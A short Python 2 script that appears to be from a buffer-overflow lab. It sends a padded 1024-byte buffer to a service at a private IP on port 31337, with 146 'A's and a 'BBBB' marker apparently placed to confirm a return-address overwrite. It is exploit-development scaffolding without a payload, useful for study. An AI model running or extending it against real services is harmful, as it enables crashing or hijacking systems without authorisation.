#!/usr/bin/env python2
import socket

RHOST="192.168.2.211"
RPORT=31337

#want to keep total length the same in case program changes actions
buf_totlen = 1024
#from last thing
offset = 146

s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((RHOST, RPORT))

buf=""
buf="A"*(offset - len(buf)) #probably not necessary to sub 0?
buf+= "BBBB"
buf+= "CCCC"
buf+= "D"*(buf_totlen - len(buf)) # keep size the same
buf+="\n"

s.send(buf)

print("Send: {0}".format(buf))

data=s.recv(1024)
print("Received: {}".format(data))

